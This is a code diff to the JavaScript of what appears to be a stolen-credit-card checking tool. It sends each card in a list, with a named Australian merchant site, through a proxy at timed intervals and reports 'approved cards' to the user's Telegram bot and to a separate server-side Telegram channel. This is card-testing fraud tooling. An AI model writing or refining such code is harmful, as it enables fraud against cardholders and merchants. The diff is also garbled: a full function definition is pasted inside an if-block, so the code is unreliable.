@@ -214,7 +214,76 @@ function processApiResponse(cc, result) {
     
     // Send Telegram notification for approved cards
     if (isSuccess && botToken && chatId) {
-        sendTelegramNotification(cc, responseMessage, category);
+        // Update the processCreditCards function
+async function processCreditCards(ccList) {
+    for (let i = 0; i < ccList.length && isProcessing; i++) {
+        const cc = ccList[i].trim();
+        if (!cc) continue;
+        
+        updateProgress(i + 1, ccList.length);
+        addTerminalMessage(`🔄 Processing: ${cc}`, 'processing');
+        
+        try {
+            // Call Vercel API proxy with user's Telegram credentials
+            const response = await fetch('/api/proxy', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    cc: cc,
+                    site: 'buildersdiscountwarehouse.com.au',
+                    userBotToken: botToken, // User's bot token
+                    userChatId: chatId      // User's chat ID
+                })
+            });
+            
+            if (!response.ok) {
+                const errorText = await response.text();
+                throw new Error(`HTTP ${response.status}: ${errorText}`);
+            }
+            
+            const result = await response.json();
+            
+            // Log Telegram notification results
+            if (result.telegram_notifications) {
+                const { user, server } = result.telegram_notifications;
+                
+                if (user.sent) {
+                    addTerminalMessage('📱 User notification sent successfully', 'success');
+                } else if (user.error) {
+                    addTerminalMessage(`📱 User notification failed: ${user.error}`, 'warning');
+                }
+                
+                if (server.sent) {
+                    addTerminalMessage('🔧 Server notification sent successfully', 'success');
+                } else if (server.error) {
+                    addTerminalMessage(`🔧 Server notification failed: ${server.error}`, 'warning');
+                }
+            }
+            
+            processApiResponse(cc, result);
+            
+        } catch (error) {
+            console.error('Request failed:', error);
+            handleError(cc, error.message);
+        }
+        
+        updateAllStats();
+        
+        // Delay between requests
+        if (isProcessing) {
+            await new Promise(resolve => setTimeout(resolve, 1500));
+        }
+    }
+    
+    if (isProcessing) {
+        processingComplete();
+    }
+}
+
+// Remove the old sendTelegramNotification function since it's now handled server-side
+// Just keep the processApiResponse function as is, but remove any client-side Telegram calls
     }
 }
 
